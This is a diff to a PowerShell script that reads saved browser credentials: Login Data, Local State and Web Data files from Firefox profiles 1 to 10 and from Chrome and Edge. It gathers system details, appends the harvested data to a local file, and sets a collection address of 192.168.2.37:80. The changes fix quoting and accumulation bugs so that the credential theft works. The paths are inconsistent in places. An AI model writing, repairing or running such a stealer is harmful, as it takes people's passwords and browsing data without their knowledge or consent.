@@ -11,76 +11,76 @@ $var += Get-WinSystemLocale
 $URI = "192.168.2.37:80"
 
 if (Test-Path -Path FireFox) { 
-    if (Test-Path -Path FireFox/User Data/Default/Login Data) {
+    if (Test-Path -Path "FireFox/User Data/Default/Login Data") {
         $var += cat -Path "Firefox/User Data/Default/Login Data"; $var += cat -Path "Firefox/User Data/Local State";$var += cat -Path "Firefox/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;
     }else{
         $Firenormal = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 1) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 1") { 
         $var += cat -Path "Firefox/UserData/Profile1/Login Data"; $var += cat -Path "Firefox/User Data/Profile1/Web Data" | Select-String -Pattern 'https' -SimpleMatch
         $FirefoxProfile1 = Write-Output "True"
     }else{
         $FirefoxProfile1 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 2) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 2") { 
         $FirefoxProfile2 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile2/Login Data"; $var += cat -Path "Firefox/User Data/Profile2/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile2 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 3) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 3") { 
         $FirefoxProfile3 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 3/Login Data"; $var += cat -Path "Firefox/User Data/Profile3/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile3 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 4) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 4") { 
         $FirefoxProfile4 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 4/Login Data"; $var += cat -Path "Firefox/User Data/Profile4/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile4 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 5) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 5") { 
         $FirefoxProfile5 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 5/Login Data"; $var += cat -Path "Firefox/User Data/Profile6/Web Data" | Select-String 
     }else{
         $FirefoxProfile5 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 6) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 6") { 
         $FirefoxProfile6 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 6/Login Data"; $var += cat -Path "Firefox/User Data/Profile7/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile6 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 7) {
+    if (Test-Path -Path "Firefox/UserData/Profile 7") {
         $FirefoxProfile7 = Write-Output "True" 
         $var += cat -Path "Firefox/UserData/Profile 7/Login Data"; $var += cat -Path "Firefox/User Data/Profile8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile7 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 8) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 8") { 
         $FirefoxProfile8 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 8/Login Data"; $var += cat -Path "Firefox/User Data/Profile8/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile8 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 9) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 9") { 
         $FirefoxProfile9 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 9/Login Data"; $var += cat -Path "Firefox/User Data/Profile9/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
         $FirefoxProfile9 = Write-Output "false"
     }
     
-    if (Test-Path -Path Firefox/UserData/Profile 10) { 
+    if (Test-Path -Path "Firefox/UserData/Profile 10") { 
         $FirefoxProfile10 = Write-Output "True"
         $var += cat -Path "Firefox/UserData/Profile 10/Login Data"; $var += cat -Path "Firefox/User Data/Profile10/Web Data" | Select-String -Pattern 'https' -SimpleMatch
     }else{
@@ -431,7 +431,7 @@ while($true)
     }
     
     if($Chromenormal -eq $True) {
-        $varper += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $varper += cat -Path "Google\Chrome\User Data\Default\Web Data" | Select-String -Pattern 'https' -SimpleMatch
         $varper += cat -Path "Microsoft/Edge\User Data/Default\Login Data"
     }else{
     
@@ -507,7 +507,7 @@ while($true)
 
     }
 
-    $varper = Get-Date
+    $varper += Get-Date
 
     $varper | Out-File fff.txt -Append
 
